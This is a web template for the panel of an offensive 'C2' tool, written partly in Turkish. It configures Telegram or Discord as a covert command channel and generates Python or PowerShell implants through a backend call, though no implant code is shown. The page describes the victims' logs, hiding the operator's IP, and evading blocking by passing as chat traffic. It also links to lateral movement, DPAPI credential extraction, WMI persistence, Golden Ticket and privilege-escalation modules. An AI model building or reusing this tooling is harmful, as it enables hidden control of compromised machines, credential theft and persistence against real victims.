{% extends "base.html" %}

{% block title %}Telegram/Discord C2 - CyberPunk{% endblock %}

{% block content %}
<div class="space-y-6">
    <!-- Header -->
    <div class="flex items-center justify-between">
        <div>
            <h1 class="text-3xl font-bold text-white flex items-center gap-3">
                <span class="text-4xl">ğŸ¤–</span>
                Telegram/Discord Bot C2
                <span class="px-2 py-1 bg-gradient-to-r from-blue-500 to-indigo-500 text-white text-xs font-bold rounded-full animate-pulse">PRO</span>
            </h1>
            <p class="text-gray-400 mt-2">IP'in ASLA gÃ¶rÃ¼nmez! Trafik Telegram/Discord sunucularÄ±na gider</p>
        </div>
        <a href="{{ url_for('dashboard.index') }}" class="px-4 py-2 bg-gray-700 hover:bg-gray-600 rounded-lg text-white transition-colors">
            â† Dashboard
        </a>
    </div>

    <!-- Info Banner -->
    <div class="bg-gradient-to-r from-blue-900/50 to-indigo-900/50 border border-blue-500/30 rounded-xl p-6">
        <div class="flex items-start gap-4">
            <div class="text-4xl">ğŸ›¡ï¸</div>
            <div>
                <h3 class="text-blue-400 font-bold text-lg">Neden Social Media C2?</h3>
                <ul class="text-gray-300 mt-2 space-y-1 text-sm">
                    <li>âœ“ <strong>IP Hidden</strong> - Victim log'larÄ±nda sadece "api.telegram.org" gÃ¶rÃ¼nÃ¼r</li>
                    <li>âœ“ <strong>No Infrastructure</strong> - Kendi C2 sunucuna gerek yok</li>
                    <li>âœ“ <strong>Can't Block</strong> - Telegram/Discord kim engelleyebilir?</li>
                    <li>âœ“ <strong>Mobile Control</strong> - Telefondan bile kontrol edebilirsin</li>
                </ul>
            </div>
        </div>
    </div>

    <!-- Platform Selection -->
    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
        <!-- Telegram -->
        <div class="bg-gray-800 rounded-xl p-6 border border-gray-700 hover:border-blue-500 transition-colors cursor-pointer" onclick="selectPlatform('TELEGRAM')">
            <div class="flex items-center gap-4 mb-4">
                <div class="w-16 h-16 bg-blue-600 rounded-xl flex items-center justify-center text-3xl">âœˆï¸</div>
                <div>
                    <h3 class="text-xl font-bold text-white">Telegram Bot</h3>
                    <p class="text-gray-400 text-sm">En popÃ¼ler, kolay kurulum</p>
                </div>
            </div>
            <ul class="text-gray-400 text-sm space-y-1">
                <li>â€¢ @BotFather ile bot oluÅŸtur</li>
                <li>â€¢ Chat ID al</li>
                <li>â€¢ Dosya gÃ¶nderme desteÄŸi</li>
                <li>â€¢ Long polling ile anlÄ±k komut</li>
            </ul>
        </div>

        <!-- Discord -->
        <div class="bg-gray-800 rounded-xl p-6 border border-gray-700 hover:border-indigo-500 transition-colors cursor-pointer" onclick="selectPlatform('DISCORD')">
            <div class="flex items-center gap-4 mb-4">
                <div class="w-16 h-16 bg-indigo-600 rounded-xl flex items-center justify-center text-3xl">ğŸ®</div>
                <div>
                    <h3 class="text-xl font-bold text-white">Discord Webhook</h3>
                    <p class="text-gray-400 text-sm">Gamer cover, webhook kolay</p>
                </div>
            </div>
            <ul class="text-gray-400 text-sm space-y-1">
                <li>â€¢ Webhook URL yeterli</li>
                <li>â€¢ Bot token'a gerek yok</li>
                <li>â€¢ Rich embed desteÄŸi</li>
                <li>â€¢ Gaming trafiÄŸi gibi gÃ¶rÃ¼nÃ¼r</li>
            </ul>
        </div>
    </div>

    <!-- Configuration Panel -->
    <div class="bg-gray-800 rounded-xl p-6 border border-gray-700">
        <h2 class="text-xl font-bold text-white mb-4 flex items-center gap-2">
            <span>âš™ï¸</span> Bot Configuration
        </h2>
        
        <form id="botConfigForm" class="space-y-4">
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                    <label class="block text-gray-300 text-sm mb-2">Platform</label>
                    <select id="platform" class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-2 text-white focus:border-blue-500 focus:outline-none">
                        {% for platform in platforms %}
                        <option value="{{ platform.name }}">{{ platform.name }}</option>
                        {% endfor %}
                    </select>
                </div>
                
                <div>
                    <label class="block text-gray-300 text-sm mb-2">Beacon Interval (sec)</label>
                    <input type="number" id="beaconInterval" value="60" min="10" max="3600"
                           class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-2 text-white focus:border-blue-500 focus:outline-none">
                </div>
            </div>
            
            <!-- Telegram Fields -->
            <div id="telegramFields">
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                        <label class="block text-gray-300 text-sm mb-2">Bot Token</label>
                        <input type="text" id="botToken" placeholder="1234567890:ABCDEF..."
                               class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-2 text-white focus:border-blue-500 focus:outline-none">
                        <p class="text-gray-500 text-xs mt-1">@BotFather'dan al</p>
                    </div>
                    
                    <div>
                        <label class="block text-gray-300 text-sm mb-2">Chat ID</label>
                        <input type="text" id="chatId" placeholder="-1001234567890"
                               class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-2 text-white focus:border-blue-500 focus:outline-none">
                        <p class="text-gray-500 text-xs mt-1">Grup/Kanal ID</p>
                    </div>
                </div>
            </div>
            
            <!-- Discord Fields -->
            <div id="discordFields" class="hidden">
                <div>
                    <label class="block text-gray-300 text-sm mb-2">Webhook URL</label>
                    <input type="text" id="webhookUrl" placeholder="https://discord.com/api/webhooks/..."
                           class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-2 text-white focus:border-blue-500 focus:outline-none">
                    <p class="text-gray-500 text-xs mt-1">Channel Settings â†’ Integrations â†’ Webhooks</p>
                </div>
            </div>
            
            <div>
                <label class="block text-gray-300 text-sm mb-2">Jitter (sec)</label>
                <input type="number" id="jitter" value="30" min="0" max="300"
                       class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-2 text-white focus:border-blue-500 focus:outline-none">
                <p class="text-gray-500 text-xs mt-1">Random delay added to beacon interval</p>
            </div>
        </form>
    </div>

    <!-- Implant Generator -->
    <div class="bg-gray-800 rounded-xl p-6 border border-gray-700">
        <h2 class="text-xl font-bold text-white mb-4 flex items-center gap-2">
            <span>ğŸ’‰</span> Implant Generator
        </h2>
        
        <form id="implantForm" class="space-y-4">
            <div>
                <label class="block text-gray-300 text-sm mb-2">Language</label>
                <select id="implantLanguage" class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-2 text-white focus:border-blue-500 focus:outline-none">
                    <option value="python">Python</option>
                    <option value="powershell">PowerShell</option>
                </select>
            </div>
            
            <button type="submit" class="w-full py-3 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 rounded-lg text-white font-bold transition-all">
                ğŸ“¦ Generate Implant
            </button>
        </form>
    </div>

    <!-- Advantages -->
    <div class="bg-gray-800 rounded-xl p-6 border border-gray-700">
        <h2 class="text-xl font-bold text-white mb-4 flex items-center gap-2">
            <span>ğŸ¯</span> Advantages
        </h2>
        
        <div class="grid grid-cols-1 md:grid-cols-3 gap-4" id="advantagesGrid">
            <div class="bg-gray-900 rounded-lg p-4 text-center">
                <div class="text-3xl mb-2">ğŸ”’</div>
                <h4 class="text-blue-400 font-bold">IP Hidden</h4>
                <p class="text-gray-400 text-sm mt-1">Victim asla senin IP'ini gÃ¶rmez</p>
            </div>
            <div class="bg-gray-900 rounded-lg p-4 text-center">
                <div class="text-3xl mb-2">ğŸ¢</div>
                <h4 class="text-blue-400 font-bold">No Server</h4>
                <p class="text-gray-400 text-sm mt-1">Kendi C2 altyapÄ±na gerek yok</p>
            </div>
            <div class="bg-gray-900 rounded-lg p-4 text-center">
                <div class="text-3xl mb-2">ğŸš«</div>
                <h4 class="text-blue-400 font-bold">Hard to Block</h4>
                <p class="text-gray-400 text-sm mt-1">Telegram.org engellenemez</p>
            </div>
            <div class="bg-gray-900 rounded-lg p-4 text-center">
                <div class="text-3xl mb-2">ğŸ”</div>
                <h4 class="text-blue-400 font-bold">TLS Default</h4>
                <p class="text-gray-400 text-sm mt-1">Platform zaten HTTPS kullanÄ±yor</p>
            </div>
            <div class="bg-gray-900 rounded-lg p-4 text-center">
                <div class="text-3xl mb-2">ğŸ“±</div>
                <h4 class="text-blue-400 font-bold">Mobile Control</h4>
                <p class="text-gray-400 text-sm mt-1">Telefondan komut gÃ¶nder</p>
            </div>
            <div class="bg-gray-900 rounded-lg p-4 text-center">
                <div class="text-3xl mb-2">ğŸ­</div>
                <h4 class="text-blue-400 font-bold">Blends In</h4>
                <p class="text-gray-400 text-sm mt-1">Normal chat trafiÄŸi gibi</p>
            </div>
        </div>
    </div>

    <!-- Implant Code -->
    <div id="implantCode" class="hidden bg-gray-800 rounded-xl p-6 border border-blue-500">
        <div class="flex justify-between items-center mb-4">
            <h2 class="text-xl font-bold text-blue-400">ğŸ’‰ Generated Implant</h2>
            <button onclick="copyImplant()" class="px-4 py-2 bg-blue-600 hover:bg-blue-500 rounded-lg text-white text-sm transition-colors">
                ğŸ“‹ Copy Code
            </button>
        </div>
        <div class="bg-green-900/30 rounded-lg p-3 mb-4 border border-green-500/30">
            <p class="text-green-400 text-sm">âœ“ Trafik <strong id="trafficDestination">api.telegram.org</strong> Ã¼zerinden gidecek - IP'in gizli!</p>
        </div>
        <pre id="implantContent" class="bg-gray-900 rounded-lg p-4 overflow-x-auto text-sm text-green-400 max-h-96 overflow-y-auto"></pre>
    </div>

    <!-- Traffic Flow Visualization -->
    <div class="bg-gray-800 rounded-xl p-6 border border-gray-700">
        <h2 class="text-xl font-bold text-white mb-4 flex items-center gap-2">
            <span>ğŸ”„</span> Traffic Flow
        </h2>
        
        <div class="flex flex-col md:flex-row items-center justify-center gap-4 text-center">
            <div class="bg-red-900/30 rounded-lg p-4 border border-red-500/30 w-full md:w-auto">
                <div class="text-2xl mb-2">ğŸ’»</div>
                <div class="text-red-400 font-bold">Victim</div>
                <div class="text-gray-500 text-xs">Implant running</div>
            </div>
            
            <div class="text-3xl text-gray-600 rotate-90 md:rotate-0">â†’</div>
            
            <div class="bg-blue-900/30 rounded-lg p-4 border border-blue-500/30 w-full md:w-auto">
                <div class="text-2xl mb-2">â˜ï¸</div>
                <div class="text-blue-400 font-bold">Telegram/Discord</div>
                <div class="text-gray-500 text-xs">api.telegram.org</div>
            </div>
            
            <div class="text-3xl text-gray-600 rotate-90 md:rotate-0">â†’</div>
            
            <div class="bg-green-900/30 rounded-lg p-4 border border-green-500/30 w-full md:w-auto">
                <div class="text-2xl mb-2">ğŸ˜ˆ</div>
                <div class="text-green-400 font-bold">You (Hidden)</div>
                <div class="text-gray-500 text-xs">Read from app</div>
            </div>
        </div>
        
        <div class="mt-4 text-center text-gray-500 text-sm">
            Victim's logs: "Connection to api.telegram.org:443" - Your IP: <span class="text-green-400">NEVER VISIBLE</span>
        </div>
    </div>
</div>

<script>
// Platform selection
function selectPlatform(platform) {
    document.getElementById('platform').value = platform;
    updatePlatformFields();
}

function updatePlatformFields() {
    const platform = document.getElementById('platform').value;
    const telegramFields = document.getElementById('telegramFields');
    const discordFields = document.getElementById('discordFields');
    
    if (platform === 'TELEGRAM') {
        telegramFields.classList.remove('hidden');
        discordFields.classList.add('hidden');
    } else if (platform === 'DISCORD') {
        telegramFields.classList.add('hidden');
        discordFields.classList.remove('hidden');
    }
}

document.getElementById('platform').addEventListener('change', updatePlatformFields);

document.getElementById('implantForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const platform = document.getElementById('platform').value;
    const body = {
        platform: platform,
        language: document.getElementById('implantLanguage').value,
        beacon_interval: parseInt(document.getElementById('beaconInterval').value),
        jitter: parseInt(document.getElementById('jitter').value)
    };
    
    if (platform === 'TELEGRAM') {
        body.bot_token = document.getElementById('botToken').value || '1234567890:EXAMPLE_TOKEN';
        body.chat_id = document.getElementById('chatId').value || '-1001234567890';
    } else {
        body.webhook_url = document.getElementById('webhookUrl').value || 'https://discord.com/api/webhooks/xxx/yyy';
    }
    
    const response = await fetch('/telegram-c2/api/generate-implant', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(body)
    });
    
    const data = await response.json();
    
    if (data.success) {
        document.getElementById('implantCode').classList.remove('hidden');
        document.getElementById('implantContent').textContent = data.code;
        document.getElementById('trafficDestination').textContent = 
            platform === 'TELEGRAM' ? 'api.telegram.org' : 'discord.com';
    } else {
        alert('Error: ' + data.error);
    }
});

function copyImplant() {
    const code = document.getElementById('implantContent').textContent;
    navigator.clipboard.writeText(code);
    alert('Implant code copied to clipboard!');
}
</script>

<!-- Cross-Module Integration Panel -->
<div class="bg-gray-800/50 rounded-xl p-6 mt-6 border border-purple-500/30" style="background: linear-gradient(135deg, rgba(59, 130, 246, 0.1), rgba(168, 85, 247, 0.1));">
    <h3 class="text-xl font-semibold text-purple-400 mb-4 flex items-center gap-2">
        <span>ğŸ”—</span> Chain with Other Modules
    </h3>
    <p class="text-gray-400 text-sm mb-4">Telegram/Discord C2 ile birlikte diÄŸer modÃ¼lleri kullanÄ±n</p>
    <div class="grid grid-cols-2 md:grid-cols-4 gap-3">
        <a href="/c2" target="_blank" class="flex items-center gap-2 px-4 py-3 bg-gray-700/50 hover:bg-gray-700 rounded-lg transition-all border border-gray-600 hover:border-blue-500 text-white text-sm">
            <span class="text-blue-400">ğŸ“¡</span> HTTP C2
        </a>
        <a href="/stego-c2" target="_blank" class="flex items-center gap-2 px-4 py-3 bg-gray-700/50 hover:bg-gray-700 rounded-lg transition-all border border-gray-600 hover:border-green-500 text-white text-sm">
            <span class="text-green-400">ğŸ–¼ï¸</span> Stego C2
        </a>
        <a href="/lateral" target="_blank" class="flex items-center gap-2 px-4 py-3 bg-gray-700/50 hover:bg-gray-700 rounded-lg transition-all border border-gray-600 hover:border-cyan-500 text-white text-sm">
            <span class="text-cyan-400">ğŸŒ</span> Lateral Move
        </a>
        <a href="/dpapi" target="_blank" class="flex items-center gap-2 px-4 py-3 bg-gray-700/50 hover:bg-gray-700 rounded-lg transition-all border border-gray-600 hover:border-yellow-500 text-white text-sm">
            <span class="text-yellow-400">ğŸ”</span> DPAPI Extract
        </a>
        <a href="/wmi-persistence" target="_blank" class="flex items-center gap-2 px-4 py-3 bg-gray-700/50 hover:bg-gray-700 rounded-lg transition-all border border-gray-600 hover:border-purple-500 text-white text-sm">
            <span class="text-purple-400">ğŸ‘»</span> WMI Persist
        </a>
        <a href="/golden" target="_blank" class="flex items-center gap-2 px-4 py-3 bg-gray-700/50 hover:bg-gray-700 rounded-lg transition-all border border-gray-600 hover:border-orange-500 text-white text-sm">
            <span class="text-orange-400">ğŸ«</span> Golden Ticket
        </a>
        <a href="/privesc-toolkit" target="_blank" class="flex items-center gap-2 px-4 py-3 bg-gray-700/50 hover:bg-gray-700 rounded-lg transition-all border border-gray-600 hover:border-red-500 text-white text-sm">
            <span class="text-red-400">â¬†ï¸</span> PrivEsc
        </a>
        <a href="/god-mode" target="_blank" class="flex items-center gap-2 px-4 py-3 bg-gray-700/50 hover:bg-gray-700 rounded-lg transition-all border border-gray-600 hover:border-pink-500 text-white text-sm">
            <span class="text-pink-400">ğŸ’€</span> God Mode
        </a>
    </div>
</div>
{% endblock %}
